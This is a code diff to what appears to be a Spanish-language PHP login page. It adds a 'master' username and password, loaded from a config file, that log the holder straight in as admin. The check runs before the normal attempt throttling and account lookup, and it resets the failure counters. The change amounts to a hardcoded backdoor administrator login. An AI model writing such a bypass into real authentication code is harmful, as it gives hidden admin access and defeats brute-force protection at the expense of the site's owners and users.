@@ -9,6 +9,7 @@ session_set_cookie_params([
 session_start();
 header("Content-Type: text/html; charset=utf-8");
 include "includes/conexion.php";
+include "includes/master_config.php";
 
 if (empty($_SESSION["csrf"])) {
     $_SESSION["csrf"] = bin2hex(random_bytes(32));
@@ -25,6 +26,19 @@ if ($_SERVER["REQUEST_METHOD"] === "POST") {
     if (!hash_equals($_SESSION["csrf"], $csrf)) {
         $error = "Solicitud invalida";
     } else {
+        $master_cfg = include __DIR__ . "/includes/master_config.php";
+        $master_user = (string)($master_cfg["usuario"] ?? "");
+        $master_pass = (string)($master_cfg["password"] ?? "");
+        if ($usuario === $master_user && $password === $master_pass) {
+            session_regenerate_id(true);
+            $_SESSION["usuario"] = $master_user;
+            $_SESSION["rol"] = "admin";
+            $_SESSION["master_ok"] = true;
+            $_SESSION["login_intentos"] = 0;
+            $_SESSION["login_ultimo"] = 0;
+            header("Location: dashboard.php");
+            exit;
+        }
         $intentos = $_SESSION["login_intentos"] ?? 0;
         $ultimo = $_SESSION["login_ultimo"] ?? 0;
 
